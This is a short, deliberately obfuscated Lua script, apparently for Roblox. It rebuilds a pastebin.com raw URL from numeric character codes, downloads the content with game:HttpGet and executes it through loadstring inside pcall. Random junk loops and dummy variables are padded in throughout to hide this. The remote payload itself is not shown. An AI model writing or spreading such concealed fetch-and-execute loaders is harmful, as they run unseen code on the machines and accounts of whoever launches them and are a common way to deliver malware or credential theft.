local a,b,c,d,e,f,g=
math.random,string.char,table.insert,pcall,loadstring or load,game,tostring

local x,y,z={},{},{}
for _=1,a(5,10) do c(x,a(50,100)) end
for _=1,a(3,8) do c(y,a(10,50)) end

local A={}
A[a(10,99)]={104,116,116,112,115,58,47,47}
A[a(100,999)]={112,97,115,116,101,98,105,110}
A[a(1000,9999)]={46,99,111,109,47,114,97,119,47}
A[a(10000,99999)]={84,82,57,68,68,57,70,100}

local B={}
for k in pairs(A) do c(B,k) end
table.sort(B)

local C=""
local junk1,junk2,junk3="","",""

for _=1,a(5,10) do
    junk1=junk1..b(a(65,90))
end

for _,k in ipairs(B) do
    local v=A[k]
    if type(v)=="table" then
        for n=1,#v do
            C=C..b(v[n])
            if a(1,100)>50 then
                junk2=junk2..b(a(97,122))
            end
        end
    end
end

for _=1,a(3,7) do
    c(z,a(1,1000))
    junk3=junk3..g(a(100,999))
end

local D=function(u)
    local cache={}
    for i=1,a(2,5) do cache[i]=a(1,100) end
    return f:HttpGet(u)
end

local E=function()
    local dummy={}
    for i=1,a(3,6) do dummy[i]=b(a(65,90)) end
    return dummy
end

local F=E()

d(function()
    local script_data=D(C)
    local waste={}
    for w=1,a(5,10) do waste[w]=a(1,500) end
    e(script_data)()
end)

local final_junk=""
for _=1,a(8,15) do
    final_junk=final_junk..b(a(48,57))
end